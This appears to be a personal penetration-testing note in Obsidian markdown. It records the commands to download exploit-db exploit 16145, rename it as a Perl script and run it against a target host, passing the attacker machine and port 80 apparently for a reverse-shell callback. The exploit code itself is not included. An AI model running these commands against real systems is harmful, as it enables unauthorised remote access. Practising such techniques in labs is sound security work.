---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
```bash - klai
wget https://www.exploit-db.com/exploits/16145
```

```bash - kali
mv 16145 16145.pl
```

![[rlwrap]]

```bash - kali
perl 16145.pl $TARGET 7778 $KALI 80
```


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
